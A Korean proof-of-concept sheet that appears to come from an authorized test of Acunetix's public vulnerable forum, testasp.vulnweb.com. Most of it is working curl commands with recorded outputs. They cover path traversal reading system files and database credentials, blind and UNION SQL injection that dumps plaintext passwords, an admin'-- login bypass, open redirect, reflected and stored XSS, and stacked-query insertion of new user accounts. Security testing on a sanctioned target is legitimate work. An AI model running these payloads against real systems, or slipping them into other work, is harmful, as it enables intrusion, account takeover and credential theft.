# PoC-코드 — testasp-vulnweb-jev-trial

- 대상: `http://testasp.vulnweb.com` (Acunetix 공개 취약 테스트 포럼, mode=`own_system`)
- 작성: 2026-09-28 · **아래 모든 명령은 실제 실행으로 성공을 확인한 것만 수록**(추정/미검증 없음)
- 전 항목 일괄 재현: `bash scripts/verify_chain.sh` (16섹션/65체크, 전부 읽기 전용)

## ⚠️ 공통 주의

1. **이 데모는 수시로 리셋된다** — 행 수·게시글 ID·계정을 하드코딩하지 말고 매번 현재 값으로 확인한다.
   (실측: posts 115→141→112, users 220→243→252 가 수 분 내 변동)
2. **파괴적 분기 존재** — `showforum.asp:54-59` 는 `total>100` 이면 `DELETE FROM threads/posts` 를 실행한다.
   → **POST 로 보낼 때 `id` 파라미터에 페이로드를 넣지 말 것**(GET 의 스택드 주입은 안전).
3. 아래 **[쓰기]** 표시 항목은 대상 데이터를 변경한다(승인 후 실행). 그 외는 전부 읽기 전용.

---

## 1. LFI #1 — `Templatize.asp?item=` (임의 파일 읽기)

```bash
# 대조군(요청 형식 유효성): 템플릿 파일은 정상적으로 읽힌다
curl -s -o /dev/null -w '%{http_code}\n' "http://testasp.vulnweb.com/Templatize.asp?item=html/about.html"        # → 200

# 웹루트 밖 파일 읽기
curl -s "http://testasp.vulnweb.com/Templatize.asp?item=../../../../windows/win.ini" | head -3                  # → [fonts] ...
curl -s -o /dev/null -w '%{http_code}\n' "http://testasp.vulnweb.com/Templatize.asp?item=../../../../windows/system.ini"               # → 200
curl -s -o /dev/null -w '%{http_code}\n' "http://testasp.vulnweb.com/Templatize.asp?item=../../../../windows/system32/drivers/etc/hosts" # → 200

# 같은 프리미티브로 애플리케이션 소스 평문 열람(화이트박스)
curl -s "http://testasp.vulnweb.com/Templatize.asp?item=db.asp" | grep -i "Provider="     # → Provider=SQLNCLI11;...Uid=acunetix;Pwd=[평문]...
```

부정 대조군: `item=global.asa` → **500**(파일 부재 시 500 = 응답 코드만으로는 차단과 구분 불가 → 항상 성공 대조군과 쌍으로 판정).

## 2. LFI #2 — `shownews.asp?item=` (미링크 orphan, 템플릿 래퍼 없는 raw 반환)

```bash
curl -s "http://testasp.vulnweb.com/shownews.asp?item=../../../../windows/win.ini" | head -3   # → [fonts] (래퍼 없음)
curl -s -o /dev/null -w '%{http_code}\n' "http://testasp.vulnweb.com/shownews.asp"             # → 500 (무파라미터 = 파라미터 부재)
```

## 3. SQLi — `showforum.asp?id=` (boolean + 스택드 시간차)

```bash
S=http://testasp.vulnweb.com/showforum.asp
curl -s -o /dev/null -w '%{http_code}\n' -G --data-urlencode "id=1 AND 1=1" "$S"   # → 200
curl -s -o /dev/null -w '%{http_code}\n' -G --data-urlencode "id=1 AND 1=2" "$S"   # → 500

# 시간차(스택드, 지연만 — 데이터 변경 없음)
curl -s -o /dev/null -w '%{time_total}\n' -G --data-urlencode "id=0;IF 1=1 WAITFOR DELAY '0:0:02'--" "$S"
curl -s -o /dev/null -w '%{time_total}\n' -G --data-urlencode "id=0;IF 1=2 WAITFOR DELAY '0:0:02'--" "$S"
# 실측: 참 32.47s vs 거짓 0.35s (사이트 부하로 지연이 확대됨 — 비율 판정은 동일)
```

※ 이 지점은 `id` 가 여러 쿼리에 재사용되어 **UNION 불가**(`0 UNION SELECT 'A','B'--` → 500) → blind/시간차 전용.

## 4. SQLi — `Search.asp?tfSearch=` (UNION 10열 = 1요청 열람)

```bash
U=http://testasp.vulnweb.com/Search.asp

# DB 이름
curl -s -G --data-urlencode "tfSearch=zzq')>0) UNION ALL SELECT 1,'ACUVERIFY='+DB_NAME(),0,0,0,0,GETDATE(),'','',''--" "$U" \
  | grep -o 'ACUVERIFY=[A-Za-z0-9_]*'          # → ACUVERIFY=acuforum

# 버전 / 계정 / 테이블
curl -s -G --data-urlencode "tfSearch=zzq')>0) UNION ALL SELECT 1,'VER='+LEFT(@@version,40),'','',0,0,GETDATE(),SUSER_NAME(),USER_NAME(),''--" "$U" \
  | grep -oE "(VER|acunetix)=[^<']*" | sort -u
# → Microsoft SQL Server 2014 (SP3-GDR) 12.0.6179.1 X64 Express Edition / SYSTEM_USER=acunetix

# users 자격증명 평문(최소 샘플 1행 — 대량 반출 금지)
curl -s -G --data-urlencode "tfSearch=zzq')>0) UNION ALL SELECT 1,'U='+uname,'P='+upass,'E='+ISNULL(email,''),0,0,GETDATE(),'','','' FROM users WHERE uname=(SELECT MIN(uname) FROM users)--" "$U" \
  | grep -oE "[UPE]=[^<']*"                     # → U=<계정명> / P=<평문 비밀번호>
```

열수 통제: 3열·9열 → 500, **10열만 렌더**(오라클 확정). 오류 기반은 불가(오류응답이 1208B IIS 기본 페이지라 SQL 오류문 미노출).

## 5. 인증 우회 — `POST Login.asp`

```bash
curl -s -o /dev/null -D - -c /tmp/acu.cookies -X POST \
  --data-urlencode "tfUName=admin'--" --data-urlencode "tfUPass=x" \
  http://testasp.vulnweb.com/Login.asp
# → HTTP/1.1 302 + Location: Default.asp + Set-Cookie: ASPSESSIONID...=...; path=/   (HttpOnly/Secure/SameSite 없음)
```

대조군: 없는 계정(`nosuchuser_zz`) → 200(로그인 실패).
※ `x' OR '1'='1` 류는 **실패**한다(`WHERE uname='x' OR '1'='1' AND upass='x'` 의 AND 우선순위로 0행) — `--` 주석형만 성립.

## 6. 오픈 리다이렉트 — `RetURL`

```bash
curl -s -o /dev/null -D - -X POST --data-urlencode "tfUName=admin'--" --data-urlencode "tfUPass=x" \
  "http://testasp.vulnweb.com/Login.asp?RetURL=http://example.com/" | grep -i '^location'     # → Location: http://example.com/

curl -s -o /dev/null -D - "http://testasp.vulnweb.com/Logout.asp?RetURL=http://example.com/" | grep -i '^location'   # → 무인증 302
```

`Response.Redirect(Request.QueryString("RetURL"))` 에 허용목록 검증이 전혀 없다(`//example.com`, `https:` 변형도 동일).

## 7. XSS — 세션명 반사 (게시 불필요, **쓰기 0**)

`Login.asp:36` 은 `Session.Contents("uname") = Request.Form("tfUName")` 로 **입력 원문**을 세션에 저장하고,
`Default.asp:55` 가 이를 `Server.HTMLEncode` 없이 출력한다. 단 로그인 판정은 `not rs.EOF` 이므로
**행을 반환하는 조건을 함께** 넣어야 한다.

```bash
XS="admin' AND '<img src=x onerror=alert(1)>'='<img src=x onerror=alert(1)>'--"
curl -s -o /dev/null -c /tmp/acu_x.cookies -X POST --data-urlencode "tfUName=$XS" --data-urlencode "tfUPass=x" \
  http://testasp.vulnweb.com/Login.asp                                  # → 302
curl -s -b /tmp/acu_x.cookies http://testasp.vulnweb.com/Default.asp | grep -o "onerror=alert(1)"   # → onerror=alert(1) (원문 렌더)
```

## 8. XSS — 저장형 (**[쓰기]** 게시글 1건 생성)

```bash
# 1) 세션 확보
curl -s -o /dev/null -c /tmp/acu.cookies -X POST --data-urlencode "tfUName=admin'--" --data-urlencode "tfUPass=x" http://testasp.vulnweb.com/Login.asp
# 2) 답글 게시 (⚠️ id 에 페이로드 금지 — 파괴적 분기 회피)
curl -s -o /dev/null -b /tmp/acu.cookies -X POST \
  --data-urlencode "tfSubject=acu-xss-check" \
  --data-urlencode "tfText=<script>alert('acu-stored-xss')</script>" \
  "http://testasp.vulnweb.com/showthread.asp?id=1"
# 3) 비인증 재방문으로 실행 확인
curl -s "http://testasp.vulnweb.com/showthread.asp?id=1" | grep -o "<script>alert('acu-stored-xss')</script>"
```

응답에 CSP/X-XSS-Protection/X-Frame-Options **전부 없음** → 스크립트 실행 보장.

## 9. second-order — 세션명이 SQL 로 재사용 (**[쓰기]** 시도, 실패로 확인)

```bash
# 5번의 우회 세션(세션명에 ' 포함) 그대로 사용
curl -s -o /dev/null -w '%{http_code}\n' -b /tmp/acu.cookies -X POST \
  --data-urlencode "tfSubject=x" --data-urlencode "tfText=y" "http://testasp.vulnweb.com/showthread.asp?id=3"   # → 500
# 정상 세션(따옴표 없음)은 같은 요청이 200 → 차이가 곧 second-order 성립 증거
```

## 10. 임의 DML (**[쓰기]** — 자체 테스트 행만 생성)

```bash
curl -s -o /dev/null -G --data-urlencode \
  "id=0;INSERT INTO users (uname,upass,email,realname,avatar) VALUES('acu-r3','P@ss-r3-verify','r3@example.com','r3','')--" \
  http://testasp.vulnweb.com/showforum.asp
# 검증: Search.asp UNION 으로 값 확인 → 그 계정으로 Login.asp POST → 302 (실사용 가능 행)
curl -s -o /dev/null -w '%{http_code}\n' -X POST --data-urlencode "tfUName=acu-r3" --data-urlencode "tfUPass=P@ss-r3-verify" http://testasp.vulnweb.com/Login.asp   # → 302
```

## 11. RCE 상한 / 권한 (실행 없는 오라클 — 부정 결과)

```bash
curl -s -G --data-urlencode "tfSearch=zzq')>0) UNION ALL SELECT 1,'SYSADMIN='+ISNULL(CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar),'N'),'XPCMD='+ISNULL(CAST((SELECT TOP 1 value_in_use FROM sys.configurations WHERE name='xp_cmdshell') AS varchar),'N'),'',0,0,GETDATE(),'CTRL='+ISNULL(CAST(HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER') AS varchar),'N'),'UPDacublog='+ISNULL(CAST(HAS_PERMS_BY_NAME('acublog.dbo.users','OBJECT','UPDATE') AS varchar),'N'),''--" \
  http://testasp.vulnweb.com/Search.asp | grep -oE "(SYSADMIN|XPCMD|CTRL|UPDacublog)=[0-9N]+"
# → SYSADMIN=0 / XPCMD=0 / CTRL=0 / UPDacublog=1
```

DB 계정 권한은 `db_datawriter` 급: `acuforum.users` UPDATE=1, `acuforum.posts` INSERT=1, **`acublog.users` UPDATE=1**(교차 DB) — 실행하지 않았고 권한만 확인.

## 12. 정보 노출 — FrontPage 메타데이터

```bash
curl -s "http://testasp.vulnweb.com/_vti_cnf/Default.asp" | grep -oE "vti_[a-z]+" | sort -u
# → vti_backlinkinfo / vti_extenderversion / vti_timelastmodified ... (서브웹명 acuforum 포함)
```

※ `_vti_cnf/<파일>` 의 200 은 "파일 존재"를 뜻하지만 **404 를 "부재"로 단정할 수 없다**
(반례: 실존하는 `Templates/MainTemplate.dwt.asp` 200 vs `Templates/_vti_cnf/` 404).
